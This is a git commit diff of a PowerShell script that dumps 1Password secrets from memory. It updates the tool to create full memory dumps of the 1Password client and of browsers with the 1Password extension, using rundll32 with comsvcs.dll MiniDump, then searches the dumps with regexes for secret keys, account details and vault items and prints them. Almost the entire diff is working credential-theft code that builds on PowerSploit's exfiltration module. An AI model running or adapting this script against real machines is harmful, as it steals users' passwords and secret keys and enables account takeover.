da536cb88593bc0b7236c076384a18796e621d89
Tiziano Marra <29025198+MrTiz@users.noreply.github.com>
2023-05-27 19:42:13 +0200

    Released version 2.0
    The 'Out-Minidump' function now needs 'NT AUTHORITY\SYSTEM' privileges to work. For this reason it has been deprecated in favor of using 'rundll32.exe'.
    
    The script has been upgraded to version 2.0, and now also supports extraction of credentials stored in 1Password extensions for browsers.

--- 1PasswordSecretsDump.ps1
+++ 1PasswordSecretsDump.ps1
@@ -5,9 +5,11 @@
     The 1Password password manager client keeps a lot of sensitive information in memory, such as credentials or any other type of document saved within the database.
 .NOTES
     Author:  Tiziano Marra (https://github.com/MrTiz)
-    Date:    2022-09-17
-    Version: 1.0
+    Date:    2023-05-27
+    Version: 2.0
 #>
+
+#########################################################
 
 function CheckIfRunAsAdministrator() {
     $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -22,7 +24,10 @@ function CheckIfRunAsAdministrator() {
     }
 }
 
-#Forked from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
+#########################################################
+
+# Forked from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
+# ON WINDOWS 11 REQUIRES 'NT AUTHORITY\SYSTEM' PERMISSIONS
 function Out-Minidump {
     [CmdletBinding()]
     Param (
@@ -67,33 +72,70 @@ function Out-Minidump {
     END {}
 }
 
-function MakeTMPFile() {
-    $TmpFile = New-TemporaryFile | Select-Object -ExpandProperty FullName
-    $File = [System.IO.Path]::ChangeExtension($TmpFile, '.dmp')
-    Rename-Item -Path $TmpFile -NewName $File -Force
+#########################################################
 
-    (Get-Item -Path $File).Encrypt()
+function dumpProcessMemory {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True)][int]$ProcessId,
+        [Parameter(Mandatory = $True)][String]$DumpFileName,
+        [Parameter(Mandatory = $True)][String]$WorkingDirectory
+    )
 
-    $Acl = Get-Acl -Path $File
+    $runDll = 'C:\Windows\System32\rundll32.exe'
+    $params = "C:\Windows\System32\comsvcs.dll MiniDump $ProcessId $DumpFileName full"
 
-    $Owner            = New-Object System.Security.Principal.Ntaccount('NT AUTHORITY\SYSTEM')
-    $SystemAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule('NT AUTHORITY\SYSTEM',    'FullControl', 'Allow')
-    $AdminAccessRule  = New-Object System.Security.AccessControl.FileSystemAccessRule('BUILTIN\Administrators', 'FullControl', 'Allow')
-
-    $Acl.SetOwner($Owner)
-    $Acl.SetAccessRuleProtection($True, $False)
-    $Acl.SetAccessRule($SystemAccessRule)
-    $Acl.SetAccessRule($AdminAccessRule)
-
-    Set-Acl -Path $File -AclObject $Acl
-
-    return $File
+    Start-Process -FilePath $runDll -WorkingDirectory $WorkingDirectory -ArgumentList $params -Wait
 }
 
-CheckIfRunAsAdministrator
-$File = MakeTMPFile
+#########################################################
 
-$Processes = Get-Process -Name '1Password'
+function checkExtensionInstalled {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True)][String]$ProcessName
+    )
+
+    $BraveExtID   = 'aeblfdkhhhdcdjpifhhbdiojplfjncoa'
+    $ChromeExtID  = 'aeblfdkhhhdcdjpifhhbdiojplfjncoa'
+    $MSedgeExtID  = 'dppgmdbiimibapkepcbdbmkaabgiofem'
+    $firefoxExtID = 'd634138d-c276-4fc8-924b-40a0ea21d284'
+
+    switch -Exact ($ProcessName) {
+        'brave' {
+            $Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Extensions\$BraveExtID"
+            return Test-Path -Path $Path -PathType Container
+        }
+        'chrome' {
+            $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\$ChromeExtID"
+            return Test-Path -Path $Path -PathType Container
+        }
+        'msedge' {
+            $Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\$MSedgeExtID"
+            return Test-Path -Path $Path -PathType Container
+        }
+        'firefox' {
+            $Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*\extensions\{$firefoxExtID}.xpi"
+            return Test-Path -Path $Path -PathType Leaf
+        }
+        Default {
+            return $False
+        }
+    }
+}
+
+#########################################################
+
+CheckIfRunAsAdministrator
+
+$Folder   = $env:TEMP
+$FileName = 'tmp1P.dmp'
+$FullPath = "$Folder\$FileName"
+
+Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
+
+###################
+
 $Patterns = @(
     '\{"account_state":"\w","account_template_version":\d+,"account_type":"\w","account_version":\d+,"base_attachment_url":".+?","base_avatar_url":".+?","secret_key":".+?\}\}',
     '\{"type":"Success","content":\{"callbackId":\d+,"response":\{"type":"NmRequestAccounts","content":\{"accounts":\[\{"type":"Unlocked","content":\{"details":\{"accountUuid":".+?\}\}\}\}',
@@ -105,16 +147,68 @@ $Patterns = @(
 
 $Pattern = "($($Patterns -Join '|'))"
 
-foreach ($Process in $Processes) {
-    Out-Minidump -Process $Process -DumpFilePath $File
+$ProcessesClient = @('1Password', '1Password-BrowserSupport')
+$ProcessesBrwExt = @('brave', 'firefox', 'msedge', 'chrome')
 
-    Select-String -Path $File -Pattern $Pattern -AllMatches | 
+$Processes = @()
+
+foreach ($Client in $ProcessesClient) {
+    $Processes += , (Get-Process -Name $Client -ErrorAction SilentlyContinue)
+}
+
+foreach ($Browser in $ProcessesBrwExt) {
+    if (checkExtensionInstalled -ProcessName $Browser) {
+        $Processes += , (Get-Process -Name $Browser -ErrorAction SilentlyContinue)
+    }
+}
+
+foreach ($ProcessId in $Processes.Id) {
+    dumpProcessMemory -ProcessId $ProcessId -DumpFileName $FileName -WorkingDirectory $Folder
+
+    if (-not (Test-Path -Path $FullPath -PathType Leaf)) {
+        continue
+    }
+
+    Select-String -Path $FullPath -Pattern $Pattern -AllMatches | 
         ForEach-Object { 
             $_.Matches
         } | 
-        ForEach-Object { 
-            Write-Host "$($_.Value)`n"
-        }
-}
+        ForEach-Object {
+            $Color = "White"
 
-Remove-Item -Path $File -Force
+            switch -Wildcard ($_.Value) {
+                '{"fields":*' {
+                    $Color = "Green"
+                    break
+                }
+                '{"type":*' {
+                    $Color = "Green"
+                    break
+                }
+                '{"sections":*' {
+                    $Color = "Green"
+                    break
+                }
+                '{"account_state":*' {
+                    $Color = "Red"
+                    break
+                }
+                '{"title":*' {
+                    $Color = "Red"
+                    break
+                }
+                '{"ps":*' {
+                    $Color = "Red"
+                    break
+                }
+                default {
+                    $Color = "Yellow"
+                    break
+                }
+            }
+            
+            Write-Host "$($_.Value)`n" -ForegroundColor $Color
+        }
+
+    Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
+}
